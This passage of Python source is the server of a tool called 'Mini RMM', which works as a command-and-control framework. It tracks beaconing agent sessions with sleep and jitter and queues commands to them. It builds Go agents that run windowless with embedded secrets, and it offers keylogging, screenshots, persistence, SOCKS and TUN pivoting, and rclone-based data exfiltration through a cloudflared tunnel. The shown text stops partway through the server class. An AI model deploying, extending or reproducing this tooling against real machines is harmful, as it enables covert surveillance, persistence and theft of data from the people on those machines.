#!/usr/bin/env python3
"""
Mini RMM HTTP Server — Compatible with cloudflared quick tunnel
Operator control: REST API under /api/v1/ (use rmm_cli.py or your own automation).
Optional embedded CLI: python server_rmm.py --cli (prompt_toolkit recommended).
Enhanced Features:
- Multi-session management
- Dynamic sleep/jitter configuration
- Tab completion and command history
- One-shot and persistent commands
- File upload/download
- Screenshot capture
- Keylogging support
- Persistence management
"""

from __future__ import annotations

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import argparse
import hashlib
import re
import secrets
import threading
import sys
import urllib.parse
import json
import time
import base64
from datetime import datetime
from collections import deque
import os
import readline
import glob
import shutil
import subprocess
import shlex
import zipfile
import json
import tempfile
from typing import Any

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object  # RMMPTKCompleter only used when prompt_toolkit is installed

from rmm_ws import OperatorEventHub, WebSocketConnection
from rmm_socks import (
    DEFAULT_SOCKS_PORT,
    DEFAULT_BIND_HOST,
    GO_SOCKS_PLUGIN_FILE,
    SocksManager,
)
from rmm_tun import TunError, TunManager, normalize_tun_config
from rmm_workspace import WorkspaceEventBroker, WorkspaceRegistry, valid_workspace_id
from rmm_asset_store import AssetError, AssetStore, decode_asset_content
from rmm_profile import ProfileError, ProfileManager, profile_directory
from rmm_ui_state import UiStateError, UiStateStore
from rmm_rclone import (
    RcloneConfigError,
    get_rclone_max_bytes,
    RCLONE_BIN_PATH,
    build_exfil_payload,
    build_exfil_command,
    build_exfil_command_from_payload,
    build_plugin_exfil_job,
    RCLONE_TOOLS_URL,
    get_rclone_default_profile,
    load_profiles,
    rclone_binary_available,
    rclone_public_config,
)

GO_TUN_PLUGIN_FILE = "tun.dll"
# History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
HISTORY_FILE = os.path.expanduser("~/.RMM_history")

# Configuration (overridden by argparse in main())
PORT = 8080  # Backward-compatible alias for the administration port.
try:
    ADMIN_PORT = int(os.environ.get("RMM_ADMIN_PORT", str(PORT)))
except (TypeError, ValueError):
    ADMIN_PORT = PORT
try:
    BEACON_PORT = int(os.environ.get("RMM_BEACON_PORT", "8081"))
except (TypeError, ValueError):
    BEACON_PORT = 8081
LOG_DIR = "RMM_logs"
WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
SERVER_TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
CLIENT_SCRIPT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "agent-powershell", "client_rmm.ps1"
)
GO_AGENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent-go")
GO_AGENT_BUILD_DIR = os.path.join(LOG_DIR, "agent-builds")
# Operator PE and script plugins served to the agent. Deploy release artifacts
# here from the external Minimal-RMM-plugins repository.
PLUGINS_DIR = os.environ.get("RMM_PLUGINS_DIR", "").strip() or os.path.join(LOG_DIR, "plugins")
ASSETS_DIR = os.environ.get("RMM_ASSETS_DIR", "").strip() or os.path.join(LOG_DIR, "assets")
UI_STATE_DB = os.environ.get("RMM_UI_STATE_DB", "").strip() or os.path.join(LOG_DIR, "ui-state.db")
PLUGIN_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$")
PLUGIN_ARTIFACT_EXTENSIONS = {".dll", ".ps1"}
PLUGIN_EXPORT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")
PLUGIN_COMMAND_RE = re.compile(r"^[A-Za-z][A-Za-z0-9._-]{0,127}$")
TUN_HELPER = os.environ.get("RMM_TUN_HELPER", "").strip() or os.path.join(SERVER_TOOLS_DIR, "rmm-tun")
SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
HISTORY_DIR = os.path.join(LOG_DIR, "history")
WEB_MIME = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".ico": "image/x-icon",
}
API_PREFIX = "/api/v1"
API_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
BEACON_SECRET = os.environ.get("RMM_BEACON_SECRET", "").strip()
INSECURE = False
LISTEN_HOST = "127.0.0.1"
BEACON_BIND = os.environ.get("RMM_BEACON_BIND", "").strip() or LISTEN_HOST
BEACON_PUBLIC_URL = os.environ.get("RMM_BEACON_PUBLIC_URL", "").strip()
MAX_RESULT_EVENTS = 500
MAX_AI_CHAT_MESSAGES = 500
# Cap event body size on operator WebSocket pushes (full text stays in memory/history/API).
MAX_WS_EVENT_BODY = 16 * 1024


def _env_int(name: str, default: int) -> int:
    raw = os.environ.get(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        return default


def configured_storage_mode() -> str:
    """Return the central persistence mode, defaulting to legacy server storage."""
    value = os.environ.get("RMM_STORAGE_MODE", "server").strip().lower()
    return value if value in {"server", "workspace"} else "server"


# Per HTTP POST (each download chunk). Override with RMM_MAX_BODY_BYTES.
MAX_BODY_BYTES = _env_int("RMM_MAX_BODY_BYTES", 32 * 1024 * 1024)
MAX_WORKSPACE_PAYLOAD_BYTES = _env_int("RMM_MAX_WORKSPACE_PAYLOAD_BYTES", MAX_BODY_BYTES)


def secure_compare(provided: str, expected: str) -> bool:
    """Constant-time secret comparison."""
    if not expected:
        return False
    if provided is None:
        provided = ""
    a = provided.encode("utf-8", errors="replace")
    b = expected.encode("utf-8", errors="replace")
    return secrets.compare_digest(a, b)


_BEACON_SESSION_UUID_RE = re.compile(
    r"^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$"
)
_BEACON_SESSION_TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")


def validate_beacon_session_id(session_id: str) -> str | None:
    """Reject path-like or unsafe beacon session IDs (blocks /tmp/pwn style abuse)."""
    if not session_id or not isinstance(session_id, str):
        return None
    sid = session_id.strip()
    if len(sid) < 8 or len(sid) > 128:
        return None
    if "/" in sid or "\\" in sid or ".." in sid or "\0" in sid:
        return None
    if sid.startswith(".") or sid.endswith("."):
        return None
    if _BEACON_SESSION_UUID_RE.match(sid):
        return sid
    if _BEACON_SESSION_TOKEN_RE.match(sid):
        return sid
    return None


def safe_session_storage_prefix(session_id: str) -> str:
    """Hash-based prefix for artifact filenames — never use session_id[:8] on disk."""
    return hashlib.sha256(session_id.encode("utf-8")).hexdigest()[:12]


def safe_storage_filename(filename: str, default: str = "download") -> str:
    """Basename-only filename safe for writes under LOG_DIR (blocks path traversal)."""
    if not filename or not isinstance(filename, str):
        return default
    name = os.path.basename(filename.replace("\\", "/")).strip().strip(".")
    if not name or name in (".", "..") or ".." in name:
        return default
    cleaned = "".join(c for c in name if c.isalnum() or c in "._- ")
    cleaned = cleaned.strip()[:200]
    return cleaned if cleaned else default


def safe_join_under(base_dir: str, *parts: str) -> str:
    """Join paths and ensure the result stays under base_dir."""
    base = os.path.realpath(base_dir)
    path = os.path.realpath(os.path.join(base, *parts))
    if path != base and not path.startswith(base + os.sep):
        raise ValueError("path escapes storage directory")
    return path


def write_atomic_bytes(path: str, content: bytes) -> None:
    """Write runtime bytes atomically so agents never read a partial artifact."""
    directory = os.path.dirname(path)
    os.makedirs(directory, exist_ok=True)
    fd, temporary = tempfile.mkstemp(prefix=".rmm-asset-", dir=directory)
    try:
        with os.fdopen(fd, "wb") as handle:
            handle.write(content)
        os.chmod(temporary, 0o600)
        os.replace(temporary, path)
    finally:
        try:
            os.unlink(temporary)
        except FileNotFoundError:
            pass


def plugin_directory(workspace_id: str | None = None) -> str:
    """Return a runtime PE plugin directory, optionally scoped to a workspace."""
    base = PLUGINS_DIR
    if workspace_id and valid_workspace_id(str(workspace_id)):
        base = os.path.join(base, "workspaces", str(workspace_id))
    os.makedirs(base, exist_ok=True)
    return base


def plugin_script_path(name: str, workspace_id: str | None = None) -> str | None:
    """Return a deployed PowerShell plugin artifact for a supported name."""
    if name not in {"socks.ps1", "screenshot.ps1"}:
        return None
    try:
        path = safe_join_under(plugin_directory(workspace_id), name)
    except ValueError:
        return None
    return path if os.path.isfile(path) else None


def _list_plugin_files_in(directory: str) -> list[dict]:
    """List supported plugin artifacts in one directory."""
    try:
        names = sorted(os.listdir(directory))
    except OSError:
        return []
    plugins = []
    for name in names:
        if not PLUGIN_NAME_RE.match(name):
            continue
        if os.path.splitext(name)[1].lower() not in PLUGIN_ARTIFACT_EXTENSIONS:
            continue
        path = os.path.join(directory, name)
        if not os.path.isfile(path):
            continue
        digest = hashlib.sha256()
        size = 0
        try:
            with open(path, "rb") as handle:
                for chunk in iter(lambda: handle.read(65536), b""):
                    digest.update(chunk)
                    size += len(chunk)
        except OSError:
            continue
        plugins.append({"name": name, "size": size, "sha256": digest.hexdigest()})
    return plugins


def list_plugin_files(workspace_id: str | None = None) -> list[dict]:
    """List global and workspace PE plugins with workspace files taking precedence."""
    global_rows = {
        row["name"]: row
        for row in _list_plugin_files_in(plugin_directory())
        if asset_store().enabled("plugins", row["name"], True)
    }
    rows = global_rows
    if workspace_id:
        rows.update({row["name"]: row for row in _list_plugin_files_in(plugin_directory(workspace_id))})
    return [rows[name] for name in sorted(rows)]


def asset_store() -> AssetStore:
    """Return the central persistent dynamic asset store."""
    return AssetStore(ASSETS_DIR)


def _workspace_plugin_path(workspace_id: str, name: str) -> str | None:
    """Resolve a workspace plugin runtime cache path."""
    if not valid_workspace_id(str(workspace_id)) or not PLUGIN_NAME_RE.fullmatch(name):
        return None
    try:
        return safe_join_under(plugin_directory(workspace_id), name)
    except ValueError:
        return None


def plugin_path_for_session(
    name: str,
    session_id: str | None = None,
    server: object | None = None,
) -> str | None:
    """Resolve a plugin from a session workspace first, then the global store."""
    if not PLUGIN_NAME_RE.fullmatch(str(name or "")):
        return None
    session = None
    if session_id:
        try:
            owner = server or RMMHandler.server_instance
            session = owner.get_session(session_id) if owner else None
        except (AttributeError, TypeError):
            session = None
    workspace_id = getattr(session, "workspace_id", None) if session else None
    if workspace_id:
        path = _workspace_plugin_path(workspace_id, name)
        if path and os.path.isfile(path):
            return path
    try:
        path = safe_join_under(plugin_directory(), name)
    except ValueError:
        return None
    return path if os.path.isfile(path) else None


def plugin_command_metadata(command: str, agent_type: str | None = None) -> dict | None:
    """Extract safe plugin identity metadata from a queued agent command."""
    fields = str(command or "").split("\n", 1)[0].split(None, 3)
    if fields and fields[0] == "__SCREENSHOT__":
        plugin = "screenshot.ps1" if str(agent_type or "").strip().lower() == "powershell" else "screenshot.dll"
        return {"plugin": plugin, "export": "Run"}
    if len(fields) < 3 or fields[0] != "__PE_LOAD__":
        if len(fields) < 3 or fields[0] != "__PLUGIN_COMMAND__":
            return None
        plugin, plugin_command = fields[1], fields[2]
        if not PLUGIN_NAME_RE.fullmatch(plugin) or not PLUGIN_COMMAND_RE.fullmatch(plugin_command):
            return None
        return {"plugin": plugin, "command": plugin_command, "export": "Run"}
    plugin, export = fields[1], fields[2]
    if not PLUGIN_NAME_RE.fullmatch(plugin) or not PLUGIN_EXPORT_RE.fullmatch(export):
        return None
    return {"plugin": plugin, "export": export}


GO_AGENT_TARGETS = {
    ("windows", "amd64"),
    ("windows", "arm64"),
    ("linux", "amd64"),
    ("linux", "arm64"),
}


def go_agent_source_files() -> list[dict[str, str]]:
    """Return the checked-in Go agent source exposed by the authenticated API."""
    root = os.path.realpath(GO_AGENT_DIR)
    files = []
    for current, _dirs, names in os.walk(root):
        for name in sorted(names):
            if name.endswith("_test.go"):
                continue
            if not (name.endswith(".go") or name in ("go.mod", "go.sum")):
                continue
            path = os.path.realpath(os.path.join(current, name))
            if not path.startswith(root + os.sep):
                continue
            with open(path, "r", encoding="utf-8") as handle:
                files.append({"filename": os.path.relpath(path, root), "content": handle.read()})
    return files


def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None) -> dict:
    """Build a fixed repository Go agent for one allowlisted OS and architecture."""
    goos = str(goos or "").strip().lower()
    goarch = str(goarch or "").strip().lower()
    if (goos, goarch) not in GO_AGENT_TARGETS:
        raise ValueError("unsupported Go target")
    root = os.path.realpath(GO_AGENT_DIR)
    if not os.path.isdir(root) or not os.path.isfile(os.path.join(root, "go.mod")):
        raise FileNotFoundError("Go agent source is not installed")
    go_bin = shutil.which("go")
    if not go_bin:
        raise RuntimeError("Go toolchain is not installed on the RMM server")
    agent_config = agent_config if isinstance(agent_config, dict) else {}
    config_values = {}
    for key in ("base_url", "beacon_secret", "session_id", "http_proxy"):
        value = str(agent_config.get(key) or "").strip()
        if "\r" in value or "\n" in value:
            raise ValueError(f"invalid {key}")
        config_values[key] = value[:4096]
    if config_values["session_id"] and not validate_beacon_session_id(config_values["session_id"]):
        raise ValueError("invalid session id")
    try:
        sleep_seconds = int(agent_config.get("sleep_seconds", 60))
        jitter_percent = int(agent_config.get("jitter_percent", 30))
    except (TypeError, ValueError) as exc:
        raise ValueError("invalid Go beacon timing") from exc
    if not 1 <= sleep_seconds <= 3600 or not 0 <= jitter_percent <= 100:
        raise ValueError("Go beacon timing is outside the allowed range")
    suffix = ".exe" if goos == "windows" else ""
    binary_filename = f"minimal-rmm-agent-{goos}-{goarch}{suffix}"
    binary_path = safe_join_under(GO_AGENT_BUILD_DIR, binary_filename)
    filename = f"minimal-rmm-agent-{goos}-{goarch}.zip"
    output_path = safe_join_under(GO_AGENT_BUILD_DIR, filename)
    go_cache = safe_join_under(LOG_DIR, "go-cache")
    os.makedirs(go_cache, exist_ok=True)
    env = os.environ.copy()
    env.update(
        {
            "CGO_ENABLED": "0",
            "GOOS": goos,
            "GOARCH": goarch,
            "GO111MODULE": "on",
            "GOCACHE": go_cache,
        }
    )
    linker_values = {
        "defaultBaseURLB64": config_values["base_url"],
        "defaultBeaconSecretB64": config_values["beacon_secret"],
        "defaultSessionIDB64": config_values["session_id"],
        "defaultHTTPProxyB64": config_values["http_proxy"],
        "defaultSleepSecondsB64": str(sleep_seconds),
        "defaultJitterPercentB64": str(jitter_percent),
    }
    linker_flags = ["-s", "-w"]
    if goos == "windows":
        linker_flags.append("-H=windowsgui")
    for name, value in linker_values.items():
        encoded = base64.b64encode(value.encode("utf-8")).decode("ascii")
        linker_flags.extend(["-X", f"main.{name}={encoded}"])
    ldflags = " ".join(shlex.quote(flag) for flag in linker_flags)
    try:
        completed = subprocess.run(
            [
                go_bin,
                "build",
                "-buildvcs=false",
                "-trimpath",
                "-ldflags",
                ldflags,
                "-o",
                binary_path,
                ".",
            ],
            cwd=root,
            env=env,
            capture_output=True,
            text=True,
            timeout=120,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError("Go build timed out after 120 seconds") from exc
    if completed.returncode != 0:
        detail = (completed.stderr or completed.stdout or "build failed").strip()
        raise RuntimeError(detail[-4000:])
    launcher_name = "run-agent.ps1" if goos == "windows" else "run-agent.sh"
    configured = {
        "RMM_BASE_URL": config_values["base_url"],
        "RMM_BEACON_SECRET": config_values["beacon_secret"],
        "RMM_SESSION_ID": config_values["session_id"],
        "RMM_SLEEP_SECONDS": str(sleep_seconds),
        "RMM_JITTER_PERCENT": str(jitter_percent),
        "RMM_HTTP_PROXY": config_values["http_proxy"],
    }
    if goos == "windows":
        launcher_config = "".join(
            f"$env:{name} = '{value.replace(chr(39), chr(39) * 2)}'\n"
            for name, value in configured.items()
            if value
        )
        launcher = (
            "$ErrorActionPreference = 'Stop'\n"
            + launcher_config
            + "$binary = Join-Path $PSScriptRoot '" + binary_filename + "'\n"
            + "if (-not $env:RMM_BASE_URL -or -not $env:RMM_BEACON_SECRET) {\n"
            + "  throw 'Set RMM_BASE_URL and RMM_BEACON_SECRET before starting the agent.'\n"
            + "}\n"
            + "& $binary\n"
        )
    else:
        launcher_config = "".join(
            f"export {name}={shlex.quote(value)}\n"
            for name, value in configured.items()
            if value
        )
        launcher = (
            "#!/bin/sh\n"
            "set -eu\n"
            + launcher_config
            + "SCRIPT_DIR=$(CDPATH= cd -- \"$(dirname -- \"$0\")\" && pwd)\n"
            + ": \"${RMM_BASE_URL:?Set RMM_BASE_URL before starting the agent.}\"\n"
            + ": \"${RMM_BEACON_SECRET:?Set RMM_BEACON_SECRET before starting the agent.}\"\n"
            + "exec \"$SCRIPT_DIR/" + binary_filename + "\"\n"
        )
    readme = f"""Minimal-RMM Go agent ({goos}/{goarch})

Files:
- {binary_filename}: compiled agent
- {launcher_name}: launcher that checks required environment variables

Required environment variables:
- RMM_BASE_URL
- RMM_BEACON_SECRET

Optional variables include RMM_SESSION_ID, RMM_SLEEP_SECONDS,
RMM_JITTER_PERCENT, RMM_HTTP_PROXY, and RMM_LOG_FILE. By default, startup and
connection errors are appended to the system temporary directory as
minimal-rmm-agent.log.

Windows PowerShell:
  $env:RMM_BASE_URL = 'https://your-rmm-server'
  $env:RMM_BEACON_SECRET = 'your-beacon-secret'
  .\\run-agent.ps1

Linux/macOS shell:
  export RMM_BASE_URL='https://your-rmm-server'
  export RMM_BEACON_SECRET='your-beacon-secret'
  chmod +x run-agent.sh
  ./run-agent.sh

Authorized lab use only.
"""
    with zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.write(binary_path, arcname=binary_filename)
        archive.writestr(launcher_name, launcher)
        archive.writestr("README.txt", readme)
    digest = hashlib.sha256()
    with open(output_path, "rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return {
        "filename": filename,
        "binary_filename": binary_filename,
        "goos": goos,
        "goarch": goarch,
        "sha256": digest.hexdigest(),
        "size": os.path.getsize(output_path),
        "download_url": f"{API_PREFIX}/artifacts/agent-builds/{filename}",
    }


def _history_session_dir(session_id: str) -> str:
    sid = validate_beacon_session_id(session_id)
    if not sid:
        raise ValueError("invalid session id")
    return safe_join_under(HISTORY_DIR, sid)


def _event_for_history(ev: dict) -> dict:
    """Drop server-local filesystem paths before writing transcripts to disk."""
    return {k: v for k, v in ev.items() if k not in {"artifact", "workspace_payload"}}


def _event_for_ws(ev: dict) -> dict:
    """Shrink large bodies so WS send_json does not block beacon handlers on slow clients."""
    out = dict(ev)
    # Workspace services consume the full payload from WorkspaceEventBroker;
    # ordinary operator WebSocket clients only need the transcript event.
    out.pop("workspace_payload", None)
    body = out.get("body")
    if isinstance(body, str) and len(body) > MAX_WS_EVENT_BODY:
        omitted = len(body) - MAX_WS_EVENT_BODY
        out["body"] = body[:MAX_WS_EVENT_BODY] + f"\n… [{omitted} chars truncated for live WS]"
        out["body_truncated"] = True
    return out

# Create directories
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)
os.makedirs(GO_AGENT_BUILD_DIR, exist_ok=True)
os.makedirs(HISTORY_DIR, exist_ok=True)

# ANSI Colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class Session:
    def __init__(self, session_id, hostname, username, ip=None):
        self.id = session_id
        self.hostname = hostname
        self.username = username
        self.ip = ip
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.cmd_queue = deque()
        self.persistent_cmd = None
        self.cmd_timeout = 30
        self.work_dir = None
        self.os_type = "windows"
        self.agent_type = "powershell"
        self.capabilities = []
        # Workspace ownership is control-plane metadata. Transcript and
        # artifact persistence belongs to the matching workspace service.
        self.workspace_id = None
        # Configuration parameters
        self.sleep_seconds = 60  # Default 1 minute
        self.jitter_percent = 30  # Default 30% jitter
        self.result_events = deque(maxlen=MAX_RESULT_EVENTS)
        self._event_seq = 0
        self.wait_lock = threading.Lock()
        self.wait_event = None
        self.wait_result = None
        self.download_artifacts = []
        self.pending_downloads = deque()
        self.pending_plugin_runs = deque()
        # True once operator/client config is known; defers idle __CONFIG__ until then.
        self.config_synced = False
        self.config_pending = False
    
    def beacon_status(self):
        """online / stale / offline from last beacon poll vs configured sleep+jitter."""
        elapsed = (datetime.now() - self.last_seen).total_seconds()
        jitter_max = self.sleep_seconds * (self.jitter_percent / 100.0)
        expected_max = self.sleep_seconds + jitter_max + 15
        if elapsed <= expected_max * 1.5:
            return "online"
        if elapsed <= expected_max * 4:
            return "stale"
        return "offline"

    def to_dict(self):
        elapsed = int((datetime.now() - self.last_seen).total_seconds())
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "ip": self.ip,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "last_seen_ago_seconds": elapsed,
            "beacon_status": self.beacon_status(),
            "work_dir": self.work_dir,
            "os_type": self.os_type,
            "agent_type": self.agent_type,
            "capabilities": list(self.capabilities),
            "workspace_id": self.workspace_id,
            "sleep_seconds": self.sleep_seconds,
            "jitter_percent": self.jitter_percent
        }
    
    def __str__(self):
        return f"{Colors.GREEN}{self.username}@{self.hostname}{Colors.END} [{self.id[:8]}]"

class Completer:
    """Custom completer for readline"""

    def __init__(self, server):
        self.server = server
        self.commands = [
            'list', 'use', 'info', 'background', 'kill',
            'set_sleep', 'set_jitter', 'show_config',
            'download', 'upload', 'exfil', 'screenshot', 'socks',
            'keylog', 'persist', 'stop',
            'install_persist', 'remove_persist',
            'help', 'clear', 'quit', 'exit',
        ]
        self.keylog_actions = ['start', 'stop', 'dump']

    def complete(self, text, state):
        """Return possible completions for the current text"""
        line = readline.get_line_buffer()
        parts = line.split()
        
        # If no text or first word being completed
        if not parts or (len(parts) == 1 and not line.endswith(' ')):
            matches = [cmd for cmd in self.commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete arguments for specific commands
        cmd = parts[0].lower()
        
        # Complete session IDs for 'use' and 'kill'
        if cmd in ['use', 'kill'] and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            if self.server.sessions:
                session_ids = [sid[:8] for sid in self.server.sessions.keys()]
                matches = [sid for sid in session_ids if sid.startswith(text)]
                if state < len(matches):
                    return matches[state]
            return None
        
        # Complete keylog actions
        if cmd == 'keylog' and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            matches = [action for action in self.keylog_actions if action.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete local files for 'upload'
        if cmd == 'upload' and len(parts) == 2 and not line.endswith(' '):
            # Complete local file path
            matches = glob.glob(text + '*')
            if state < len(matches):
                return matches[state]
            return None
        
        return None


class RMMPTKCompleter(_PTCompleterBase):
    """prompt_toolkit completer mirroring Completer (no readline.get_line_buffer)."""

    def __init__(self, server):
        super().__init__()
        self.server = server
        self._words = Completer(server)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in self._words.commands:
                if cmd.startswith(prefix):
                    yield Completion(cmd + " ", start_position=-len(prefix))
            return

        cmd = parts[0].lower()

        if cmd in ("use", "kill"):
            if len(parts) == 1 and line.endswith(" "):
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    yield Completion(s8 + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    if s8.startswith(prefix):
                        yield Completion(s8, start_position=-len(prefix))
                return

        if cmd == "keylog":
            if len(parts) == 1 and line.endswith(" "):
                for a in self._words.keylog_actions:
                    yield Completion(a + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for a in self._words.keylog_actions:
                    if a.startswith(prefix):
                        yield Completion(a + " ", start_position=-len(prefix))
                return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _build_cli_prompt(server):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    prefix = f"{Colors.DIM}[{ts}]{Colors.END} "
    if server.current_session:
        sess = server.get_session(server.current_session)
        if sess:
            return f"{prefix}{Colors.GREEN}RMM [{sess.id[:8]}] > {Colors.END}"
        server.current_session = None
    return f"{prefix}{Colors.GREEN}RMM > {Colors.END}"


def _run_cli_prompt_toolkit(server, cli):
    """Fixed bottom input line; client output prints above (patch_stdout)."""
    from prompt_toolkit import PromptSession
    from prompt_toolkit.formatted_text import ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.patch_stdout import patch_stdout

    server._cli_use_ptk = True
    session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RMMPTKCompleter(server),
        complete_style="COLUMN",
        enable_history_search=True,
    )
    with patch_stdout():
        while server.running:
            try:
                prompt = _build_cli_prompt(server)
                cmd = session.prompt(ANSI(prompt))
                if not cli.execute_command(cmd):
                    break
            except KeyboardInterrupt:
                # Ctrl+C: cancel current line (like a shell); do not exit the server
                continue
            except EOFError:
                # Ctrl+D: end session (empty buffer in prompt_toolkit)
                server.tty_print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
                break


def _run_cli_readline(server, cli):
    """Fallback: stdlib readline + input() when prompt_toolkit is not installed."""
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(1000)
    completer = Completer(server)
    readline.set_completer(completer.complete)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n;")

    while server.running:
        try:
            prompt = _build_cli_prompt(server)
            cmd = input(prompt)
            if not cli.execute_command(cmd):
                break
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
            break


class RMMServer:
    storage_mode = "server"

    def __init__(self):
        self.storage_mode = configured_storage_mode()
        self.workspace_registry = WorkspaceRegistry.from_environment()
        self.workspace_events = WorkspaceEventBroker()
        self.sessions = {}
        self.killed_sessions = set()
        self._persisted_session_configs = self._load_persisted_session_configs()
        self._persisted_session_records = self._load_persisted_session_records()
        self.session_lock = threading.Lock()
        self.tty_lock = threading.Lock()  # Serialize async client stdout
        self._cli_use_ptk = False  # True when using prompt_toolkit (skip readline.redisplay in handle_result)
        self.current_session = None
        self.running = True
        self.event_hub = OperatorEventHub()
        self.socks = SocksManager(log_fn=self.log)
        self.tun_transport = SocksManager(log_fn=self.log)
        self.tun = TunManager(TUN_HELPER, self.tun_transport, log_fn=self.log)
        self.admin_port = ADMIN_PORT
        self.beacon_port = BEACON_PORT
        self.beacon_public_url = BEACON_PUBLIC_URL
        self.profile_manager = ProfileManager(profile_directory(), log_fn=self.log)
        self.profile_name = os.environ.get("RMM_PROFILE_NAME", "cloudflared").strip().lower()
        # In workspace mode this stores transport-only relay configuration;
        # the workspace service creates the listener or TUN device locally.
        self.workspace_socks_configs = {}
        self.workspace_tun_configs = {}
        self._sessions_broadcast_lock = threading.Lock()
        self._sessions_broadcast_timer = None
        self._ui_state_store: UiStateStore | None = None
        if self.storage_mode == "server":
            self._archive_orphaned_sessions_on_startup()

    def ui_state(self) -> UiStateStore:
        """Return the lazily opened SQLite store for server-mode UI state."""
        if self._ui_state_store is None:
            self._ui_state_store = UiStateStore(UI_STATE_DB)
        return self._ui_state_store

    def get_ui_state(self) -> dict[str, dict[str, str]] | None:
        """Load the persisted server-mode operator UI state."""
        return self.ui_state().get("server")

    def set_ui_state(self, payload: dict[str, Any]) -> dict[str, Any]:
        """Persist the server-mode operator UI state in SQLite."""
        return self.ui_state().set("server", payload)

    def set_listener_ports(self, admin_port: int, beacon_port: int) -> None:
        """Record the bound administration and beacon ports for generated agents."""
        self.admin_port = int(admin_port)
        self.beacon_port = int(beacon_port)

    def profile_status(self) -> dict[str, Any]:
        """Return safe RMM-Profile and beacon transport status."""
        status = self.profile_manager.status()
        status["beacon_port"] = self.beacon_port
        status["beacon_public_url"] = self.beacon_public_url or None
        status["profile_name"] = self.profile_name or None
        return status

    def start_profile(self, name: str | None = None, config: dict[str, Any] | None = None) -> dict[str, Any]:
        """Start a dynamic profile and publish the URL agents must use."""
        selected = (name or self.profile_name or "").strip().lower()
        if not selected:
            raise ProfileError("profile name is required")
        event = self.profile_manager.start(
            selected,
            listen_host="127.0.0.1" if BEACON_BIND in {"0.0.0.0", "::", ""} else BEACON_BIND,
            listen_port=self.beacon_port,
            config=config,
        )
        self.profile_name = selected
        self.beacon_public_url = str(event.get("public_url") or "").rstrip("/")
        self.log(f"RMM-Profile {selected} ready: {self.beacon_public_url}", "SUCCESS")
        return self.profile_status()

    def stop_profile(self) -> bool:
        """Stop the active profile and clear its public agent URL."""
        stopped = self.profile_manager.stop()
        self.beacon_public_url = BEACON_PUBLIC_URL
        return stopped

    def skill_directories(self) -> list[str]:
        """Return built-in and centrally managed skill directories."""
        return [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai-skills"),
            os.path.join(ASSETS_DIR, "skills"),
        ]

    def skill_overrides(self) -> dict[str, bool]:
        """Return central dynamic skill enablement flags."""
        flags = asset_store().flags("skills")
        for name, enabled in list(flags.items()):
            if name.lower().endswith(".md"):
                flags.setdefault(os.path.splitext(name)[0].lower(), enabled)
        return flags

    def list_ai_skills(self) -> list[dict]:
        """Return built-in and uploaded AI skill metadata."""
        from rmm_ai_skills import list_ai_skills

        return list_ai_skills(self.skill_directories(), self.skill_overrides())

    def rclone_profiles(self) -> dict[str, dict]:
